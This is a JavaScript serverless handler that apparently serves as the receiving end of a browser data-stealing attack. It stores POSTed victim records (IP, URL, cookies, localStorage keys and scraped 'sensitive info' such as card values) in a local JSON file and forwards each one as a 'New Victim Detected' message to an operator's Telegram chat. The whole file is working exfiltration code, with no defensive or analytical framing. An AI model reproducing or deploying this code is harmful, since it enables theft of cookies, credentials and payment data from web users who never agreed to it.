const fs = require('fs');
const path = require('path');

// Telegram Config
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function sendToTelegram(data) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    // Format Message
    let msg = `🔓 *New Victim Detected*\n\n`;
    msg += `🆔 *IP:* \`${data.ip}\`\n`;
    msg += `🌐 *URL:* ${data.url}\n`;
    msg += `🖥️ *UA:* \`${data.userAgent.substring(0, 50)}...\`\n`;
    
    if (data.sensitiveInfo && data.sensitiveInfo.length > 0) {
        msg += `\n💳 *Sensitive Info Found:*\n`;
        data.sensitiveInfo.forEach(item => {
            msg += `• ${item.type}: \`${item.value}\`\n`;
        });
    } else {
        msg += `\n💳 *Sensitive Info:* None detected in DOM.`;
    }

    msg += `\n🍪 *Cookies:* ${data.cookies ? data.cookies.split(';').length + ' found' : 'None'}`;
    msg += `\n💾 *Local Storage Keys:* ${Object.keys(data.storage.localStorage || {}).join(', ')}`;

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        })
    }).catch(err => console.error("Telegram Error:", err));
}

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const data = req.body;
        
        // Save to local JSON file (simulating DB)
        const filePath = path.join(process.cwd(), 'data.json');
        let existingData = [];
        if (fs.existsSync(filePath)) {
            try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
        }
        existingData.push(data);
        fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));

        // Send to Telegram
        sendToTelegram(data);

        res.status(200).json({ status: 'ok' });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
}